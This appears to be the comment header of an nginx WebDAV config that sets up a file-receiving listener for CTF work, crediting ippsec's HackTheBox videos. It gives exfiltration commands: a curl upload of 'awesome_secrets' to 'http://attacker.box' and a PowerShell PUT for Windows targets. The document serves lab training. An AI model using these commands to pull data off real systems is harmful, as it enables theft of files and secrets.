# This is an nginx config that we can run on our local machine
# to receive files from boxes when we are doing CTFs.
# It has been tested on Kali Linux Rolling
# WebDAV is not built into nginx by default, so you may have to
# build a custom copy with the --with-http_dav_module configuration
# parameter (./configure --with-http_dav_module)
# The nginx that ships with Kali has this module built in.
#
# It uses WebDAV to receive files
# The idea came from ippsec's hackthebox videos
#
# Put this file in /etc/nginx/sites-available and link it to sites-enabled
# ln -s /etc/nginx/sites-available/nginx_file_listener /etc/nginx/sites-enabled
#
# Restart nginx
# systemctl restart nginx
#
# To use it, use curl (which is installed by default on a lot of systems) like so:
# curl --upload-file <file_name> http://<server_IP>/<path>
# 
# For example:
# curl --upload-file awesome_secrets http://attacker.box/secretfiles
#
# This will upload the file awesome_secrets to
# /var/www/uploads/secretfiles/awesome_secrets on our box.
#
# For a Windows box, you can use Invoke-RestMethod:
# Invoke-RestMethod -Uri http://<server_IP>:<port>/<path>/<file name> -Method Put -InFile <path to file>
